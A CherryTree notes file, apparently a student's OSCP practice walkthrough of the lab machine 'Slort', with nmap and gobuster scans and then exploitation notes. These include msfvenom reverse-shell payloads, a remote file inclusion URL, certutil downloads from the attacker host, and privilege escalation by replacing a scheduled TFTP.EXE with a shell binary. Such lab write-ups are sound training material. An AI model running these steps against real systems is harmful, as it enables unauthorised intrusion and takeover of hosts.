<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="192.168.208.53" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
    <rich_text>IP :192.168.208.53
Hostname:
OS:





Linux Proof: </rich_text>
    <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
    <rich_text>
Windows Proof: </rich_text>
    <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
    <rich_text>
</rich_text>
    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1688507947">
      <node name="NMAP" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688503563" ts_lastsave="1688503573">
        <rich_text>Nmap Output:

</rich_text>
        <codebox char_offset="14" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">the ports found are: 21,135,139,445,3306,4443,5040,7680,8080,49664,49665,49666,49667,49668,49669
PGPractice/Slort/nmap/allTCPNmap.log
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-04 16:37 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:37
Completed NSE at 16:37, 0.00s elapsed
Initiating NSE at 16:37
Completed NSE at 16:37, 0.00s elapsed
Initiating NSE at 16:37
Completed NSE at 16:37, 0.00s elapsed
Initiating Ping Scan at 16:37
Scanning 192.168.208.53 [2 ports]
Completed Ping Scan at 16:37, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:37
Completed Parallel DNS resolution of 1 host. at 16:37, 0.00s elapsed
Initiating Connect Scan at 16:37
Scanning 192.168.208.53 (192.168.208.53) [15 ports]
Discovered open port 445/tcp on 192.168.208.53
Discovered open port 8080/tcp on 192.168.208.53
Discovered open port 21/tcp on 192.168.208.53
Discovered open port 3306/tcp on 192.168.208.53
Discovered open port 139/tcp on 192.168.208.53
Discovered open port 135/tcp on 192.168.208.53
Discovered open port 7680/tcp on 192.168.208.53
Discovered open port 4443/tcp on 192.168.208.53
Discovered open port 5040/tcp on 192.168.208.53
Discovered open port 49667/tcp on 192.168.208.53
Discovered open port 49664/tcp on 192.168.208.53
Discovered open port 49669/tcp on 192.168.208.53
Discovered open port 49665/tcp on 192.168.208.53
Discovered open port 49668/tcp on 192.168.208.53
Discovered open port 49666/tcp on 192.168.208.53
Completed Connect Scan at 16:37, 0.07s elapsed (15 total ports)
Initiating Service scan at 16:37
Scanning 15 services on 192.168.208.53 (192.168.208.53)
Service scan Timing: About 53.33% done; ETC: 16:38 (0:00:38 remaining)
Completed Service scan at 16:39, 157.63s elapsed (15 services on 1 host)
NSE: Script scanning 192.168.208.53.
Initiating NSE at 16:39
Completed NSE at 16:40, 15.05s elapsed
Initiating NSE at 16:40
Completed NSE at 16:40, 1.10s elapsed
Initiating NSE at 16:40
Completed NSE at 16:40, 0.00s elapsed
Nmap scan report for 192.168.208.53 (192.168.208.53)
Host is up (0.034s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   LDAPBindReq, NULL: 
|_    Host '192.168.45.169' is not allowed to connect to this MariaDB server
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.208.53:4443/dashboard/
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.208.53:8080/dashboard/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94%I=7%D=7/4%Time=64A482FD%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.169'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBindRe
SF:q,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.169'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-04T20:39:56
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
Initiating NSE at 16:40
Completed NSE at 16:40, 0.00s elapsed
Initiating NSE at 16:40
Completed NSE at 16:40, 0.00s elapsed
Initiating NSE at 16:40
Completed NSE at 16:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.59 seconds
</codebox>
      </node>
      <node name="http" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688505012" ts_lastsave="1688511894">
        <rich_text>we see </rich_text>
        <rich_text family="monospace">8080</rich_text>
        <rich_text> and </rich_text>
        <rich_text family="monospace">4443</rich_text>
        <rich_text> 
which have http so we run gobuster and get the following output:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>




if we visit </rich_text>
        <rich_text family="monospace">/site</rich_text>
        <rich_text>

we have </rich_text>
        <rich_text link="webs http://192.168.208.53:4443/Site/index.php?page=about.php">http://192.168.208.53:4443/Site/index.php?page=about.php</rich_text>
        <rich_text>
Craig Davidson -- Engineer
Jane Simpson --  Architect
Richard Wilson -- Civil Engineer


From the URL we can try remote file inclusion

with a php reverse shell.

generate the php revshell via msfvenom

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

run a listener via
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

i got the first rev shell but it keeps dropping so I use another one first create the exe via
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

and download it via this

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

then just use it via </rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="88" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">http://192.168.208.53:4443/img                  (Status: 301) [Size: 345] [--&gt; http://192.168.208.53:4443/img/]
http://192.168.208.53:4443/site                 (Status: 301) [Size: 346] [--&gt; http://192.168.208.53:4443/site/]
http://192.168.208.53:4443/examples             (Status: 503) [Size: 1060]
http://192.168.208.53:4443/licenses             (Status: 403) [Size: 1205]
http://192.168.208.53:4443/dashboard            (Status: 301) [Size: 351] [--&gt; http://192.168.208.53:4443/dashboard/]
http://192.168.208.53:4443/%20                  (Status: 403) [Size: 1046]
http://192.168.208.53:4443/IMG                  (Status: 301) [Size: 345] [--&gt; http://192.168.208.53:4443/IMG/]
http://192.168.208.53:4443/Site                 (Status: 301) [Size: 346] [--&gt; http://192.168.208.53:4443/Site/]
http://192.168.208.53:4443/*checkout*           (Status: 403) [Size: 1046]
http://192.168.208.53:4443/Img                  (Status: 301) [Size: 345] [--&gt; http://192.168.208.53:4443/Img/]
http://192.168.208.53:4443/phpmyadmin           (Status: 403) [Size: 1205]
http://192.168.208.53:4443/webalizer            (Status: 403) [Size: 1046]
http://192.168.208.53:4443/*docroot*            (Status: 403) [Size: 1046]
http://192.168.208.53:4443/*                    (Status: 403) [Size: 1046]
http://192.168.208.53:4443/con                  (Status: 403) [Size: 1046]
http://192.168.208.53:4443/Dashboard            (Status: 301) [Size: 351] [--&gt; http://192.168.208.53:4443/Dashboard/]
http://192.168.208.53:4443/http%3A              (Status: 403) [Size: 1046]
http://192.168.208.53:4443/**http%3a            (Status: 403) [Size: 1046]
http://192.168.208.53:4443/*http%3A             (Status: 403) [Size: 1046]
http://192.168.208.53:4443/xampp                (Status: 301) [Size: 347] [--&gt; http://192.168.208.53:4443/xampp/]
http://192.168.208.53:4443/aux                  (Status: 403) [Size: 1046]
http://192.168.208.53:4443/**http%3A            (Status: 403) [Size: 1046]
http://192.168.208.53:4443/%C0                  (Status: 403) [Size: 1046]
</codebox>
        <codebox char_offset="381" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">msfvenom -p php/reverse_php LHOST=192.168.45.169 LPORT=4444 -o shell.php</codebox>
        <codebox char_offset="403" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nc -nvlp 4444</codebox>
        <codebox char_offset="406" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">192.168.208.53:4443/Site/index.php?page=http://192.168.45.169/shell.php</codebox>
        <codebox char_offset="503" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=4445 -f exe -o rev.exe</codebox>
        <codebox char_offset="532" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil.exe -urlcache -split -f http://192.168.45.169/rev.exe  rev.exe</codebox>
        <codebox char_offset="556" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">rev.exe</codebox>
      </node>
      <node name="PrivEscalation" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688507947" ts_lastsave="1688512366">
        <rich_text>we see at c:/Backup we find info.txt and TFTP.txt

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

which is run every 5 minutes


so we generate our payload:
since its tftp we will put port as 21
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

copy it using certutil (reference: </rich_text>
        <rich_text link="webs https://lolbas-project.github.io/lolbas/Binaries/Certutil/">https://lolbas-project.github.io/lolbas/Binaries/Certutil/</rich_text>
        <rich_text>)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


alternate:



copy it via



then move it via




after a lot of time u wil get the rev shell
</rich_text>
        <codebox char_offset="51" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">irectory of C:\Backup

07/20/2020  07:08 AM    &lt;DIR&gt;          .
07/20/2020  07:08 AM    &lt;DIR&gt;          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
06/23/2020  07:49 PM            73,802 TFTP.EXE
               3 File(s)         85,179 bytes
               2 Dir(s)  28,563,816,448 bytes free
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
</codebox>
        <codebox char_offset="151" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=21 -f exe -o TFTP.EXE </codebox>
        <codebox char_offset="250" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil.exe -f -urlcache -split http://192.168.45.169/TFTP.EXE </codebox>
        <codebox char_offset="253" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">or</codebox>
        <codebox char_offset="269" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=4446 -f exe -o revTFTP.exe</codebox>
        <codebox char_offset="285" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">certutil.exe -f -urlcache -split http://192.168.45.169/revTFTP.exe </codebox>
        <codebox char_offset="306" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">move revTFTP.exe TFTP.exe</codebox>
      </node>
    </node>
    <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 



</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel






</rich_text>
    </node>
    <node name="Priv Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474606">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 

</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel

</rich_text>
    </node>
    <node name="Goodies" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1688505205">
      <node name="Hashes" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949998"/>
      <node name="Passwords" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492950150"/>
      <node name="Proof\Flags\Other" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1688512588">
        <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; type local.txt &amp;&amp; ipconfig /all</rich_text>
        <rich_text>








</rich_text>
        <encoded_png char_offset="59" justification="left" link="">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